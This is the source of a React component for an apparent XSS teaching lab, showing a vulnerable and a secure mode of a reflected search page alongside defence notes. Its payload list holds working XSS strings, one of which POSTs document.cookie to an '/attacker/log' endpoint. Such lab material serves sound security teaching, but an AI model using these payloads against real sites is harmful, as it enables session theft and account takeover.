import { useState, useEffect, useCallback, useRef } from 'react'
import api from '../utils/axiosConfig'
import { exploitPayloads } from '../utils/exploitPayloads'

function ReflectedXSS({ mode }) {
  const [searchQuery, setSearchQuery] = useState('')
  const [result, setResult] = useState('')
  const [iframeContent, setIframeContent] = useState('')
  const [loading, setLoading] = useState(false)
  const [logs, setLogs] = useState([])
  const executionRef = useRef(false)

  useEffect(() => {
    // Set some demo cookies for the cookie stealing demonstration
    if (!document.cookie.includes('demo_session')) {
      document.cookie = 'demo_session=abc123; path=/'
      document.cookie = 'user_token=xyz789; path=/'
      document.cookie = 'preferences=dark_mode; path=/'
    }
  }, [])

  const handleSearch = async (e) => {
    e.preventDefault()
    
    if (!searchQuery.trim()) {
      setResult('Please enter a search query')
      return
    }
    
    // Prevent multiple executions
    if (executionRef.current) {
      return
    }
    
    executionRef.current = true
    setLoading(true)
    
    try {
      const response = await api.get(`/reflected?q=${encodeURIComponent(searchQuery)}&mode=${mode}`, {
        responseType: 'text'
      })
      
      setIframeContent(response.data)
      
      // Add log entry
      const logEntry = {
        timestamp: new Date().toISOString(),
        query: searchQuery,
        mode: mode,
        status: mode === 'vulnerable' ? 'EXECUTED' : 'BLOCKED',
        description: mode === 'vulnerable' 
          ? 'Payload reflected in HTML response - XSS will execute in iframe'
          : 'Payload safely encoded - XSS blocked'
      }
      setLogs(prev => [logEntry, ...prev.slice(0, 4)]) // Keep last 5 logs
      
      setResult(mode === 'vulnerable' 
        ? 'Search executed! Check the iframe below - XSS payloads will execute there.' 
        : 'Search executed in SECURE mode. Payloads are encoded and safe.')
        
    } catch (error) {
      console.error('Error:', error)
      setResult('Error performing search request')
    } finally {
      setLoading(false)
      // Reset execution flag after a delay
      setTimeout(() => {
        executionRef.current = false
      }, 1000)
    }
  }

  const clearDemo = useCallback(() => {
    executionRef.current = false
    setSearchQuery('')
    setResult('')
    setIframeContent('')
    setLogs([])
  }, [])

  // Enhanced payloads with better visual feedback (iframe-friendly)
  const enhancedPayloads = [
    '<script>alert("🚨 Reflected XSS Executed!")</script>',
    '<img src=x onerror="alert(\'🖼️ Image XSS Attack!\')">', 
    '<svg onload="alert(\'📊 SVG XSS Attack!\')">', 
    '<script>document.body.style.backgroundColor="red"; alert("Background changed to red!")</script>',
    '<script>document.body.innerHTML += "<h1 style=color:red;text-align:center;padding:20px;background:yellow;>🚨 XSS EXECUTED! 🚨</h1>"</script>',
    '<script>alert("🍪 Cookies: " + document.cookie)</script>',
    '<script>document.write("<div style=color:red;font-size:24px;text-align:center;padding:20px;border:3px solid red;margin:20px;><h2>⚠️ XSS PAYLOAD EXECUTED ⚠️</h2><p>This demonstrates successful code injection!</p></div>")</script>',
    '<script>fetch("/attacker/log", {method:"POST", body:"cookies=" + document.cookie}).then(function(){alert("📡 Data sent to attacker!")}).catch(function(e){alert("🚫 Network blocked: " + e.message)})</script>'
  ]

  return (
    <div className="content-section">
      <div className="glass-card">
        <div className="section-header">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div>
              <h1 className="section-title">Reflected XSS Attack</h1>
              <p className="section-subtitle">Test reflected cross-site scripting vulnerabilities</p>
            </div>
            <span className="badge">
              {mode === 'vulnerable' ? '⚠️ VULNERABLE' : '🔒 SECURE'}
            </span>
          </div>
        </div>

        <div className="alert-box">
          <h3 className="alert-title">⚠️ How Reflected XSS Works</h3>
          <div className="alert-content">
            <p>
              Reflected XSS occurs when user input is immediately reflected in the server response
              without proper encoding. The payload is included in the URL and executed when the page loads.
            </p>
            
            <div style={{ 
              marginTop: '1rem', 
              padding: '1rem', 
              background: 'rgba(59, 130, 246, 0.1)', 
              border: '1px solid rgba(59, 130, 246, 0.3)',
              borderRadius: '8px'
            }}>
              <h4 style={{ color: '#60a5fa', marginBottom: '0.5rem' }}>🔄 Attack Flow:</h4>
              <div style={{ fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
                <p>1. <strong>Injection:</strong> Attacker crafts malicious URL with XSS payload</p>
                <p>2. <strong>Delivery:</strong> Victim clicks the malicious link</p>
                <p>3. <strong>Reflection:</strong> Server reflects payload in HTML response</p>
                <p>4. <strong>Execution:</strong> Browser executes the reflected script</p>
                <p>5. <strong>Impact:</strong> Cookies stolen, session hijacked, or DOM manipulated</p>
              </div>
            </div>
            
            <p style={{ marginTop: '1rem', fontWeight: 600 }}>Try these payloads:</p>
            <div style={{ display: 'grid', gap: '0.75rem', marginTop: '0.75rem' }}>
              {enhancedPayloads.map((payload, idx) => (
                <div key={idx} style={{ 
                  display: 'flex', 
                  alignItems: 'center', 
                  gap: '1rem', 
                  padding: '0.75rem', 
                  background: 'rgba(255, 255, 255, 0.05)', 
                  borderRadius: '6px',
                  border: '1px solid rgba(255, 255, 255, 0.1)'
                }}>
                  <code style={{ 
                    flex: 1, 
                    color: '#fbbf24', 
                    fontSize: '0.875rem',
                    wordBreak: 'break-all'
                  }}>
                    {payload}
                  </code>
                  <button
                    className="payload-button"
                    onClick={() => setSearchQuery(payload)}
                    style={{
                      padding: '0.5rem 1rem',
                      background: 'rgba(59, 130, 246, 0.2)',
                      border: '1px solid rgba(59, 130, 246, 0.5)',
                      borderRadius: '4px',
                      color: '#60a5fa',
                      cursor: 'pointer',
                      fontSize: '0.875rem'
                    }}
                  >
                    Use
                  </button>
                </div>
              ))}
            </div>
            
            <p style={{ marginTop: '1rem', fontWeight: 600, color: '#fbbf24' }}>
              Impact: These payloads can steal cookies, manipulate the DOM, and execute arbitrary JavaScript.
            </p>
            
            <div style={{ 
              marginTop: '1rem', 
              padding: '1rem', 
              background: 'rgba(255, 193, 7, 0.1)', 
              border: '1px solid rgba(255, 193, 7, 0.3)',
              borderRadius: '8px'
            }}>
              <h4 style={{ color: '#fbbf24', marginBottom: '0.5rem' }}>🎯 What You'll See:</h4>
              <div style={{ fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
                <p>• <strong>Alert Boxes:</strong> Pop-up dialogs showing successful XSS execution</p>
                <p>• <strong>Background Changes:</strong> Page background color will change to red</p>
                <p>• <strong>DOM Manipulation:</strong> New content will be injected into the page</p>
                <p>• <strong>Cookie Access:</strong> Alerts showing stolen cookie values</p>
                <p>• <strong>Network Requests:</strong> Attempts to send data to attacker servers</p>
              </div>
            </div>
          </div>
        </div>

        <form onSubmit={handleSearch} style={{ marginTop: '1.5rem' }}>
          <div className="form-group">
            <label htmlFor="search" className="form-label">
              Search Query:
            </label>
            <input
              type="text"
              id="search"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Enter search term or XSS payload"
              className="form-input"
            />
            <small style={{ color: 'var(--text-secondary)', fontSize: '0.875rem', marginTop: '0.5rem', display: 'block' }}>
              {mode === 'vulnerable' 
                ? '⚠️ Vulnerable mode: Input will be reflected without encoding'
                : '🔒 Secure mode: Input will be HTML-encoded before reflection'
              }
            </small>
          </div>
          
          <div style={{ display: 'flex', gap: '1rem', alignItems: 'center' }}>
            <button 
              type="submit" 
              disabled={loading}
              className={`btn ${loading ? 'btn-loading' : ''}`}
            >
              {loading ? 'Searching...' : 'Search'}
            </button>
            
            <button
              type="button"
              onClick={clearDemo}
              style={{
                padding: '0.5rem 1rem',
                background: 'rgba(239, 68, 68, 0.2)',
                border: '1px solid rgba(239, 68, 68, 0.5)',
                borderRadius: '6px',
                color: '#fca5a5',
                cursor: 'pointer'
              }}
            >
              Clear Demo
            </button>
            
            <div style={{ 
              padding: '0.5rem 1rem', 
              background: mode === 'vulnerable' ? 'rgba(239, 68, 68, 0.1)' : 'rgba(16, 185, 129, 0.1)', 
              border: mode === 'vulnerable' ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(16, 185, 129, 0.3)', 
              borderRadius: '6px',
              color: mode === 'vulnerable' ? '#fca5a5' : '#6ee7b7',
              fontSize: '0.875rem'
            }}>
              {mode === 'vulnerable' ? '⚠️ Raw reflection enabled' : '🛡️ HTML encoding enabled'}
            </div>
          </div>
        </form>

        {result && (
          <div style={{ 
            marginTop: '1rem', 
            padding: '1rem', 
            borderRadius: '8px',
            background: result.includes('Error') ? 'rgba(239, 68, 68, 0.1)' : mode === 'vulnerable' ? 'rgba(239, 68, 68, 0.1)' : 'rgba(16, 185, 129, 0.1)',
            border: result.includes('Error') ? '1px solid rgba(239, 68, 68, 0.3)' : mode === 'vulnerable' ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(16, 185, 129, 0.3)',
            color: result.includes('Error') ? '#fca5a5' : mode === 'vulnerable' ? '#fca5a5' : '#6ee7b7'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <div style={{ 
                width: '8px', 
                height: '8px', 
                borderRadius: '50%', 
                background: result.includes('Error') ? '#ef4444' : mode === 'vulnerable' ? '#ef4444' : '#10b981' 
              }}></div>
              <span style={{ fontWeight: 600 }}>{result}</span>
            </div>
          </div>
        )}

        {/* Iframe Display for Vulnerable Mode */}
        {iframeContent && mode === 'vulnerable' && (
          <div style={{ marginTop: '2rem' }}>
            <div className="section-header">
              <h3 className="section-title" style={{ fontSize: '1.125rem' }}>Server Response (Live Execution)</h3>
              <p style={{ color: '#fca5a5', fontSize: '0.875rem', fontWeight: 600 }}>
                ⚠️ DANGER: This iframe displays the raw server response - XSS payloads will execute!
              </p>
            </div>
            <div style={{ 
              border: '2px solid rgba(239, 68, 68, 0.5)', 
              borderRadius: '8px', 
              overflow: 'hidden',
              background: 'rgba(239, 68, 68, 0.05)'
            }}>
              <div style={{ 
                padding: '0.75rem', 
                background: 'rgba(239, 68, 68, 0.1)',
                borderBottom: '1px solid rgba(239, 68, 68, 0.3)',
                fontSize: '0.875rem',
                color: '#fca5a5'
              }}>
                <strong>⚠️ LIVE EXECUTION ZONE:</strong> The content below is the actual server response with your payload
                <div style={{ marginTop: '0.5rem', fontSize: '0.75rem' }}>
                  🔍 <strong>What to expect:</strong> Alerts, DOM changes, background color changes, and cookie access
                </div>
              </div>
              <iframe
                key={`iframe-${Date.now()}`}
                srcDoc={iframeContent}
                style={{ 
                  width: '100%', 
                  minHeight: '300px', 
                  background: 'white', 
                  border: 'none',
                  display: 'block'
                }}
                title="Reflected XSS Result"
                sandbox="allow-scripts allow-modals allow-forms allow-popups"
                onLoad={() => {
                  // Prevent iframe from affecting parent
                  console.log('Iframe loaded - XSS will execute within iframe context');
                }}
              />
            </div>
          </div>
        )}

        {/* Secure Mode Display */}
        {iframeContent && mode === 'secure' && (
          <div style={{ marginTop: '2rem' }}>
            <div className="section-header">
              <h3 className="section-title" style={{ fontSize: '1.125rem' }}>Server Response (Secure)</h3>
              <p style={{ color: '#6ee7b7', fontSize: '0.875rem', fontWeight: 600 }}>
                🔒 SECURE: HTML is properly encoded - XSS payloads are neutralized
              </p>
            </div>
            <div style={{ 
              border: '2px solid rgba(20, 184, 166, 0.3)', 
              borderRadius: '8px',
              background: 'rgba(20, 184, 166, 0.05)'
            }}>
              <div style={{ 
                padding: '0.75rem', 
                background: 'rgba(16, 185, 129, 0.1)',
                borderBottom: '1px solid rgba(16, 185, 129, 0.3)',
                fontSize: '0.875rem',
                color: '#6ee7b7'
              }}>
                <strong>🛡️ SAFE DISPLAY:</strong> HTML entities are encoded, preventing script execution
              </div>
              <div style={{ padding: '1rem' }}>
                <pre style={{ 
                  whiteSpace: 'pre-wrap', 
                  wordBreak: 'break-all',
                  color: 'var(--text-primary)',
                  fontSize: '0.875rem',
                  margin: 0
                }}>
                  {iframeContent}
                </pre>
              </div>
            </div>
          </div>
        )}

        {/* Execution Logs */}
        {logs.length > 0 && (
          <div style={{ marginTop: '2rem' }}>
            <div className="section-header">
              <h3 className="section-title" style={{ fontSize: '1.125rem' }}>Execution Logs</h3>
              <p className="section-subtitle">Real-time monitoring of reflected XSS attempts</p>
            </div>
            
            <div className="logs-panel">
              {logs.map((log, idx) => (
                <div key={idx} className="log-entry">
                  <div className="log-header">
                    <span className="log-time">
                      {new Date(log.timestamp).toLocaleTimeString()}
                    </span>
                    <span style={{ 
                      color: log.status === 'EXECUTED' ? '#fca5a5' : '#6ee7b7',
                      fontWeight: 600 
                    }}>
                      {log.status === 'EXECUTED' ? '⚠️ XSS EXECUTED' : '🛡️ XSS BLOCKED'}
                    </span>
                  </div>
                  
                  <div style={{ marginTop: '0.5rem', fontSize: '0.875rem' }}>
                    <div><strong>Query:</strong> <code style={{ color: '#fbbf24' }}>{log.query}</code></div>
                    <div><strong>Mode:</strong> {log.mode}</div>
                    <div><strong>Result:</strong> {log.description}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      <div className="glass-card">
        <div className="section-header">
          <h2 className="section-title">Understanding Reflected XSS</h2>
          <p className="section-subtitle">The most common type of XSS attack</p>
        </div>
        
        <div className="info-grid">
          <div className="info-card">
            <h3 className="info-card-title">🎯 Attack Characteristics</h3>
            <div className="info-card-content">
              <p><strong>Delivery:</strong> Malicious URL sent to victim</p>
              <p><strong>Execution:</strong> Immediate reflection in response</p>
              <p><strong>Scope:</strong> Affects individual victims</p>
              <p><strong>Storage:</strong> No server-side storage required</p>
              <p><strong>Detection:</strong> Often found in search forms</p>
            </div>
          </div>
          
          <div className="info-card">
            <h3 className="info-card-title">🛡️ Defense Strategies</h3>
            <div className="info-card-content">
              <p><strong>Output Encoding:</strong> HTML entity encoding</p>
              <p><strong>Input Validation:</strong> Whitelist allowed characters</p>
              <p><strong>CSP Headers:</strong> Block inline script execution</p>
              <p><strong>Template Security:</strong> Use safe templating engines</p>
              <p><strong>URL Validation:</strong> Validate and sanitize parameters</p>
            </div>
          </div>
        </div>

        <div style={{ marginTop: '2rem', padding: '1rem', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: '8px' }}>
          <h4 style={{ color: '#60a5fa', marginBottom: '0.5rem' }}>💡 Why Reflected XSS is Common</h4>
          <div style={{ fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
            <p>• <strong>Easy to Find:</strong> Search forms, error pages, and user input fields</p>
            <p>• <strong>Simple to Exploit:</strong> Just craft a malicious URL</p>
            <p>• <strong>Social Engineering:</strong> Victims click "legitimate" looking links</p>
            <p>• <strong>Immediate Impact:</strong> No need to store payloads on server</p>
            <p>• <strong>Hard to Detect:</strong> Appears in legitimate website context</p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default ReflectedXSS

